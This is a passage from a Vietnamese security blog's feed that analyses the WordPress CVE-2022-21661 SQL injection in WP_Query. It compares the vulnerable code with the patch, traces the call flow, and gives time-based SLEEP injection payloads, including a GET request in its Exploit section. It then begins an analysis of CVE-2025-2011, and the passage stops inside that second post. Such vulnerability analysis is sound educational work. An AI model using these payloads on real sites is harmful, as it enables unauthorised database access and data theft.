tr·ª±c ti·∫øp t·∫°i ƒë√¢y. Do ƒë√≥, ƒë·ªÉ ph√¢n t√≠ch m·ªôt l·ªó h·ªïng, ta ch·ªâ c·∫ßn t√¨m ƒë·∫øn commit li√™n quan v√† quan s√°t s·ª± thay ƒë·ªïi trong m√£ ngu·ªìn.&lt;/p&gt;&#xA;&lt;p&gt;Trong ph·∫ßn reference c·ªßa &lt;strong&gt;CVE-2022-21661&lt;/strong&gt;, c√≥ li√™n k·∫øt ƒë·∫øn &lt;a href=&#34;https://github.com/WordPress/wordpress-develop/commit/17efac8c8ec64555eff5cf51a3eff81e06317214&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;commit&lt;/a&gt; tr√™n GitHub:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/patch_diff.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;So s√°nh b·∫£n v√° gi·ªØa hai phi√™n b·∫£n&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;L·ªó h·ªïng ƒë∆∞·ª£c v√° trong file &lt;strong&gt;src/wp-includes/class-wp-tax-query.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n l·ªói&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$query[&amp;#39;terms&amp;#39;] = array_unique( (array) $query[&amp;#39;terms&amp;#39;] );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;√âp &lt;code&gt;$query[&#39;terms&#39;]&lt;/code&gt; th√†nh m·∫£ng v√† lo·∫°i b·ªè gi√° tr·ªã tr√πng l·∫∑p.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng c√≥ b∆∞·ªõc ki·ªÉm tra ho·∫∑c √©p ki·ªÉu d·ªØ li·ªáu, d·∫´n ƒë·∫øn nguy c∆° ch√®n d·ªØ li·ªáu kh√¥ng h·ª£p l·ªá v√†o truy v·∫•n SQL.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;V√≠ d·ª•:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$args = [&#xA;    &amp;#39;post_type&amp;#39; =&amp;gt; &amp;#39;post&amp;#39;,&#xA;    &amp;#39;tax_query&amp;#39; =&amp;gt; [&#xA;        [&#xA;            &amp;#39;taxonomy&amp;#39; =&amp;gt; &amp;#39;category&amp;#39;,&#xA;            &amp;#39;field&amp;#39; =&amp;gt; &amp;#39;term_taxonomy_id&amp;#39;,&#xA;            &amp;#39;terms&amp;#39; =&amp;gt; [&amp;#39;1) AND (SELECT SLEEP(5)) # &amp;#39;],&#xA;            &amp;#39;operator&amp;#39; =&amp;gt; &amp;#39;IN&amp;#39;,&#xA;        ],&#xA;    ],&#xA;];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;B·∫£n v√°&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( &amp;#39;slug&amp;#39; === $query[&amp;#39;field&amp;#39;] || &amp;#39;name&amp;#39; === $query[&amp;#39;field&amp;#39;] ) {&#xA;    $query[&amp;#39;terms&amp;#39;] = array_unique( (array) $query[&amp;#39;terms&amp;#39;] );&#xA;} else {&#xA;    $query[&amp;#39;terms&amp;#39;] = wp_parse_id_list( $query[&amp;#39;terms&amp;#39;] );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;B·ªï sung ƒëi·ªÅu ki·ªán d·ª±a v√†o &lt;code&gt;$query[&#39;field&#39;]&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu l√† &lt;strong&gt;slug&lt;/strong&gt; ho·∫∑c &lt;strong&gt;name&lt;/strong&gt; =&amp;gt; gi·ªØ nguy√™n c√°ch x·ª≠ l√Ω c≈©.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu l√† &lt;strong&gt;ID&lt;/strong&gt; =&amp;gt; d√πng &lt;code&gt;wp_parse_id_list()&lt;/code&gt; ƒë·ªÉ √©p ki·ªÉu d·ªØ li·ªáu th√†nh m·∫£ng s·ªë nguy√™n an to√†n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Ta bi·∫øt ƒë√¢y l√† b∆∞·ªõc √©p ki·ªÉu d·ªØ li·ªáu th√†nh m·∫£ng s·ªë nguy√™n b·ªüi v√¨ trong &lt;code&gt;tax_query&lt;/code&gt;&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;, tham s·ªë &lt;code&gt;field&lt;/code&gt; ch·ªâ nh·∫≠n 4 gi√° tr·ªã: &lt;code&gt;slug&lt;/code&gt;, &lt;code&gt;name&lt;/code&gt;, &lt;code&gt;term_taxonomy_id&lt;/code&gt; v√† &lt;code&gt;term_id&lt;/code&gt;. Trong ƒë√≥, hai tr∆∞·ªùng &lt;code&gt;term_taxonomy_id&lt;/code&gt; v√† &lt;code&gt;term_id&lt;/code&gt; thu·ªôc b·∫£ng &lt;code&gt;wp_term_taxonomy&lt;/code&gt; v√† ƒë·ªÅu c√≥ ki·ªÉu d·ªØ li·ªáu &lt;strong&gt;BIGINT UNSIGNED&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; DESC wp_term_taxonomy;&#xA;&amp;#43;------------------&amp;#43;-----------------&amp;#43;------&amp;#43;-----&amp;#43;---------&amp;#43;----------------&amp;#43;&#xA;| Field            | Type            | Null | Key | Default | Extra          |&#xA;&amp;#43;------------------&amp;#43;-----------------&amp;#43;------&amp;#43;-----&amp;#43;---------&amp;#43;----------------&amp;#43;&#xA;| term_taxonomy_id | bigint unsigned | NO   | PRI | NULL    | auto_increment |&#xA;| term_id          | bigint unsigned | NO   | MUL | 0       |                |&#xA;| taxonomy         | varchar(32)     | NO   | MUL |         |                |&#xA;| description      | longtext        | NO   |     | NULL    |                |&#xA;| parent           | bigint unsigned | NO   |     | 0       |                |&#xA;| count            | bigint          | NO   |     | 0       |                |&#xA;&amp;#43;------------------&amp;#43;-----------------&amp;#43;------&amp;#43;-----&amp;#43;---------&amp;#43;----------------&amp;#43;&#xA;6 rows in set (0.01 sec)&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How it work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/debug1.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Breakpoint t·∫°i ƒë·∫ßu h√†m clean_query&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/debug2.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Ti·∫øp t·ª•c ƒë·∫øn query c√≥ taxonomy kh·ªõp&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/debug3.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Quan s√°t wp_list_pluck ghi ƒë√® terms&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/debug4.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Tr√°nh ghi ƒë√® terms b·∫±ng return s·ªõm&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/debug5.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Payload gi·ªØ nguy√™n trong truy v·∫•n th·ª±c thi&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack1.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;ƒê·ªëi t∆∞·ª£ng WP_Query ƒë∆∞·ª£c t·∫°o&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack2.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;H√†m __construct c·ªßa WP_Query ƒë∆∞·ª£c g·ªçi&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack3.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;G·ªçi get_posts ƒë·ªÉ th·ª±c thi query&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack4.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;ƒêi·ªÅu ki·ªán trong get_posts th·ªèa m√£n, g·ªçi get_sql&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack5.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;get_sql tr·∫£ v·ªÅ get_sql_clauses&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack6.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;get_sql_clauses g·ªçi get_sql_for_query&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack8.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Duy·ªát m·∫£ng query trong get_sql_for_query&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack15.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Ki·ªÉm tra keys terms, taxonomy, operator,...&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack7.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;G·ªçi get_sql_for_clause&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack9.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Bypass clean_query gi·ªØ nguy√™n payload&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack10.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Payload g√°n v√†o $sql[&amp;#39;where&amp;#39;]&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack11.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Th√™m () v√†o m·ªánh ƒë·ªÅ WHERE&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack16.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Th√™m AND v√† tr·∫£ v·ªÅ get_sql&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack14.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;get_posts nh·∫≠n gi√° tr·ªã t·ª´ get_sql&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack12.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Payload th√™m v√†o $clauses[&amp;#39;where&amp;#39;]&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack13.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Quan s√°t last_query t·∫°i n∆°i th·ª±c thi SQL&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Chart minh h·ªça lu·ªìng th·ª±c thi&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/chart.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Bi·ªÉu ƒë·ªì lu·ªìng th·ª±c thi c·ªßa WP_Query d·∫´n ƒë·∫øn SQLi&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Thay gi√° tr·ªã c·ªßa &lt;code&gt;terms&lt;/code&gt; b·∫±ng payload SQLi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /demo/?terms=1)&amp;#43;AND&amp;#43;(SELECT&amp;#43;1&amp;#43;FROM&amp;#43;(SELECT&amp;#43;SLEEP(5))a)&amp;#43;%23&amp;#43; HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/detect.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;K·∫øt qu·∫£ ph·∫£n h·ªìi cho th·∫•y truy v·∫•n ch·∫≠m do payload ho·∫°t ƒë·ªông&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2022-21661&lt;/strong&gt; trong &lt;strong&gt;WordPress Core&lt;/strong&gt; tr∆∞·ªõc phi√™n b·∫£n &lt;strong&gt;5.8.3&lt;/strong&gt;, quay ng∆∞·ª£c ƒë·∫øn t·∫≠n phi√™n b·∫£n &lt;strong&gt;3.7.37&lt;/strong&gt;, xu·∫•t ph√°t t·ª´ vi·ªác l√†m s·∫°ch d·ªØ li·ªáu (&lt;strong&gt;sanitization&lt;/strong&gt;) kh√¥ng ƒë√∫ng c√°ch trong &lt;code&gt;WP_Query&lt;/code&gt; d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2022-21661&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2022-21661 Detail&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;notes&#34;&gt;&lt;span&gt;Notes&lt;/span&gt;&#xA;  &lt;a href=&#34;#notes&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;div class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;&#xA;&lt;hr&gt;&#xA;&lt;ol&gt;&#xA;&lt;li id=&#34;fn:1&#34;&gt;&#xA;&lt;p&gt;V√¨ patch n·∫±m trong file &lt;strong&gt;src/wp-includes/class-wp-tax-query.php&lt;/strong&gt;, file n√†y ƒë·ªãnh nghƒ©a class &lt;code&gt;WP_Tax_Query&lt;/code&gt;, ch·ªãu tr√°ch nhi·ªám x·ª≠ l√Ω tham s·ªë &lt;code&gt;tax_query&lt;/code&gt; trong &lt;code&gt;WP_Query&lt;/code&gt;. N·∫øu c√≥ thay ƒë·ªïi trong file n√†y th√¨ g·∫ßn nh∆∞ ch·∫Øc ch·∫Øn n√≥ li√™n quan ƒë·∫øn qu√° tr√¨nh &lt;strong&gt;parse/validate&lt;/strong&gt; c·ªßa &lt;code&gt;tax_query&lt;/code&gt;.&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;/div&gt;</description>
    </item>
    <item>
      <title>CVE-2025-2011 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-09-30-cve-2025-2011/</link>
      <pubDate>Tue, 30 Sep 2025 19:08:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-09-30-cve-2025-2011/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-30-cve-2025-2011/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;L·ªó h·ªïng x·∫£y ra tr√™n plugin &lt;strong&gt;Depicter Slider&lt;/strong&gt; c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n &lt;strong&gt;3.6.2&lt;/strong&gt;. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-2011&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-2011&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/depicter/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Depicter Slider Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.6.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;:  High (9.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 